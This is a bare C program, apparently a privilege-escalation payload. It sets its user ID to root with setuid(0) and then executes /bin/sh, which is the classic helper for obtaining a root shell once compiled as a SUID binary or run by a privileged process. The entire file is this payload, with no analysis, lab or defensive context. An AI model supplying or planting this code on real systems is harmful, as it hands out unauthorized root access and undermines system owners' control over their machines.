
#include <stdio.h>
int main(){
setuid(0);
execve("/bin/sh",NULL,NULL);
}
